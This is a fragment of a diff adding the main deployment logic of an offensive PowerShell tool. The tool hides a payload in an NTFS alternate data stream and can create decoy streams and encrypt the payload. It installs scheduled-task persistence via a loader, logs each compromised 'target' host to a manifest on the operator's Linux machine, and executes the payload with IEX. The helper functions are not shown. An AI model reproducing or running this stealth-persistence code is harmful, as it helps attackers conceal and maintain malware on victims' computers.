+        PersistenceMethod = $Persist
+        DecoysCount = $CreateDecoys
+        ZeroWidthMode = $ZeroWidthMode
+        HybridPrefix = $HybridPrefix
+        Randomized = $Randomize.IsPresent
+    }
+}
+
+# Normal execution path (not GenerateOnly)
+# Create decoys
+if ($CreateDecoys -gt 0) {
+    Create-DecoyStreams -HostPath $config.HostPath -Count $CreateDecoys
+}
+
+# Write payload
+$adsPath = Write-ADSPayload -HostPath $config.HostPath `
+                            -StreamName $config.StreamName `
+                            -PayloadContent $Payload `
+                            -EncryptPayload:$Encrypt
+
+if (-not $adsPath) {
+    Write-Error "Failed to create ADS"
+    exit 1
+}
+
+# Create persistence
+if ($Persist -ne 'none') {
+    $loader = Build-Loader -HostPath $config.HostPath `
+                          -StreamName $config.StreamName `
+                          -IsEncrypted:$Encrypt
+
+    switch ($Persist) {
+        'task' {
+            $taskName = Create-ScheduledTaskPersistence -LoaderScript $loader -TaskName $taskName
+            Write-Host "[+] Persistence: Scheduled Task '$taskName'" -ForegroundColor Green
+        }
+        'registry' {
+            Write-Warning "Registry persistence not implemented in this version"
+        }
+        'wmi' {
+            Write-Warning "WMI persistence not implemented in this version"
+        }
+    }
+}
+
+# Save manifest (Linux only - not on Windows target)
+if ($ManifestPath) {
+    $payloadHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new([System.Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
+    
+    $entry = Create-ManifestEntry -TargetHost $env:COMPUTERNAME `
+                                  -FilePath $config.HostPath `
+                                  -StreamName $config.StreamName `
+                                  -PayloadHash $payloadHash `
+                                  -PersistenceMethod $Persist
+
+    Save-ManifestToLinux -Entries @($entry) -OutputPath $ManifestPath
+    Write-Host "[+] Manifest saved: $ManifestPath" -ForegroundColor Green
+}
+
+# Execute
+if (-not $NoExec) {
+    Write-Verbose "Executing payload..."
+    try {
+        IEX $Payload
+    } catch {
+        Write-Error "Execution failed: $_"
+    }
+}
+
+Write-Host "[+] Deployment complete" -ForegroundColor Green
+
+#endregion
